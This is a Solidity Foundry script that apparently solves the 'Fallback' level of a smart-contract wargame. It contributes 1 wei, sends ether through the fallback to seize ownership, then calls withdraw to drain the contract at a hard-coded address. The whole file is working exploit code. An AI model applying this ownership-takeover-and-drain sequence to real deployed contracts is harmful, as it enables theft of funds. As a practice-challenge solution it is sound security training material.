// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/FallBack.sol";
import "forge-std/Test.sol";
import "forge-std/console.sol";

contract FallBackSolution is Test {
    Fallback level1 =
        Fallback(payable(0x06Cf114eb4058C930D7fCE5FA4fF5FBb1Dcf4c57));

    function test() external {
        vm.startBroadcast();

        level1.contribute{value: 1 wei}();
        level1.getContribution();
        address(level1).call{value: 1 wei}("");
        level1.owner();
        level1.withdraw();

        vm.stopBroadcast();
    }
}
